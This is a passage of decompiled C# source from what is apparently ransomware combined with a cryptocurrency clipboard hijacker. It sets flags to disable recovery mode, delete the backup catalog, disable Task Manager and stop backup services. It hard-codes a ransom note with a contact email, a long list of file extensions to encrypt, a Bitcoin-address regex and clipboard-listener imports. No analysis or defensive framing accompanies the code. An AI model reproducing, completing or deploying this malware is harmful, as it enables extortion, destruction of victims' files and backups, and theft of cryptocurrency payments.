		private static bool checkdisableRecoveryMode = true;

		// Token: 0x04000015 RID: 21
		private static bool checkdeleteBackupCatalog = true;

		// Token: 0x04000016 RID: 22
		private static bool disableTaskManager = true;

		// Token: 0x04000017 RID: 23
		private static bool checkStopBackupServices = true;

		// Token: 0x04000018 RID: 24
		public static string appMutexStartup2 = "19DpJAWr6NCVT2";

		// Token: 0x04000019 RID: 25
		public static string appMutex2 = Program.appMutexStartup2 + Program.appMutexRun2;

		// Token: 0x0400001A RID: 26
		public static string staticSplit = "bc";

		// Token: 0x0400001B RID: 27
		public static string appMutex = Program.staticSplit + Program.appMutexStartup + Program.appMutexRun;

		// Token: 0x0400001C RID: 28
		public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

		// Token: 0x0400001D RID: 29
		private static List<string> messages = new List<string>
		{
			"------------------------ ALL YOUR FILES ARE ENCRYPTED ------------------------",
			"",
			"Don't worry, you can return all your files!",
			"All your files documents, photos, databases and other important are encrypted with strongest encryption and unique key.",
			"The only method of recovering files is to purchase decrypt tool and unique key for you.",
			"This software will decrypt all your encrypted files.",
			"What guarantees do we give to you?",
			"You can send one of your encrypted file from your PC and we decrypt it for free.",
			"But we can decrypt only 1 file for free. File must not contain valuable information",
			"Don't try to use third-party decrypt tools because it will destroy your files.",
			"Discount 50% available if you contact us first 24 hours.",
			"",
			"To get this software you need write on our e-mail:",
			"ransom.data@gmail.com"
		};

		// Token: 0x0400001E RID: 30
		private static string[] validExtensions = new string[]
		{
			".js",
			".sln",
			".suo",
			".cs",
			".c",
			".cpp",
			".pas",
			".h",
			".asm",
			".sqlite3",
			".sqlitedb",
			".sql",
			".accdb",
			".mdb",
			".db",
			".cmd",
			".bat",
			".lnk",
			".url",
			".mat",
			".kys",
			".pif",
			".scf",
			".shs",
			".shb",
			".xnx",
			".ps1",
			".vbs",
			".vb",
			".pl",
			".jsp",
			".php",
			".asp",
			".rb",
			".java",
			".jar",
			".class",
			".sh",
			".mp3",
			".wav",
			".swf",
			".fla",
			".wmv",
			".mpg",
			".vob",
			".mpeg",
			".asf",
			".avi",
			".mov",
			".mp4",
			".3gp",
			".mkv",
			".3g2",
			".flv",
			".raw",
			".gif",
			".png",
			".bmp",
			".jpg",
			".jpeg",
			".vcd",
			".iso",
			".backup",
			".zip",
			".rar",
			".7z",
			".gz",
			".tgz",
			".ta",
			".pdf",
			".pptx",
			".ppt",
			".xltm",
			".xltx",
			".xlc",
			".xlm",
			".xlt",
			".xlw",
			".xlsb",
			".xlsm",
			".xlsx",
			".xls",
			".docx",
			".doc",
			".htm,",
			".html",
			".php5",
			".php",
			".phtml",
			".fla",
			".cmd",
			".ink",
			".exe",
			". txt",
			".gif",
			".csv",
			".raw",
			".lua",
			".dat",
			".vbs",
			".vb6",
			".apk",
			".config",
			".c",
			".resx",
			".vbproj",
			".myapp",
			".cache",
			".pdb",
			".manifest",
			".png",
			".bmp",
			".eps",
			".hdr",
			".exr",
			".ico",
			".svg",
			".tga",
			".tiff",
			".wbmp",
			".webp"
		};

		// Token: 0x0400001F RID: 31
		private static Random random = new Random();

		// Token: 0x02000003 RID: 3
		public static class NativeMethods
		{
			// Token: 0x06000025 RID: 37
			[DllImport("user32.dll", SetLastError = true)]
			[return: MarshalAs(UnmanagedType.Bool)]
			public static extern bool AddClipboardFormatListener(IntPtr hwnd);

			// Token: 0x06000026 RID: 38
			[DllImport("user32.dll", SetLastError = true)]
			public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

			// Token: 0x04000021 RID: 33
			public const int clp = 797;

			// Token: 0x04000022 RID: 34
			public static IntPtr intpreclp = new IntPtr(-3);
		}
	}
}
